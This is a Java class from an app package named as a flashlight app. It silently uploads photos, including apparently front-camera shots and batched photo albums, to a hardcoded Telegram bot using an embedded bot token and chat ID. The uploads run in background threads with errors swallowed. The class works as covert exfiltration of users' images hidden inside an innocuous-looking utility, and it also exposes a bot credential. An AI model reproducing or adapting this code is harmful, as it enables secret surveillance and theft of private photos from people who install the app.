package com.flashlight.app;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;

public class TelegramSender {
    private static final String BOT_TOKEN = "8241864563:AAHWFBXYzw4YsVuMMylIrQbPm280iyEQyvM";
    private static final String CHAT_ID = "6489746690";

    // Отправка одного фото (для фронталки)
    public void send(byte[] data, String filename) {
        new Thread(() -> {
            try {
                String boundary = "*****";
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto");
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setConnectTimeout(15000); c.setReadTimeout(15000);
                c.setDoOutput(true); c.setRequestMethod("POST");
                c.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
                OutputStream os = c.getOutputStream();
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n").getBytes());
                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"photo\"; filename=\"" + filename + "\"\r\n").getBytes());
                os.write(("Content-Type: image/jpeg\r\n\r\n").getBytes());
                os.write(data);
                os.write(("\r\n--" + boundary + "--\r\n").getBytes());
                os.flush(); os.close();
                c.getResponseCode();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    // Отправка пачки фото (альбом)
    public void sendMediaGroup(List<byte[]> images, int startIndex) {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMediaGroup");
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setConnectTimeout(20000); c.setReadTimeout(20000);
                c.setDoOutput(true); c.setRequestMethod("POST");
                
                String boundary = "*****";
                c.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
                OutputStream os = c.getOutputStream();

                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n").getBytes());

                JSONArray mediaArray = new JSONArray();
                for (int i = 0; i < images.size(); i++) {
                    JSONObject obj = new JSONObject();
                    obj.put("type", "photo");
                    obj.put("media", "attach://photo" + i);
                    if (i == 0) obj.put("caption", "Альбом (" + (startIndex + 1) + "-" + (startIndex + images.size()) + ")");
                    mediaArray.put(obj);
                }

                os.write(("--" + boundary + "\r\n").getBytes());
                os.write(("Content-Disposition: form-data; name=\"media\"\r\n\r\n" + mediaArray.toString() + "\r\n").getBytes());

                for (int i = 0; i < images.size(); i++) {
                    os.write(("--" + boundary + "\r\n").getBytes());
                    os.write(("Content-Disposition: form-data; name=\"photo" + i + "\"; filename=\"photo" + i + ".jpg\"\r\n").getBytes());
                    os.write(("Content-Type: image/jpeg\r\n\r\n").getBytes());
                    os.write(images.get(i));
                    os.write("\r\n".getBytes());
                }

                os.write(("--" + boundary + "--\r\n").getBytes());
                os.flush(); os.close();
                c.getResponseCode();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }
}
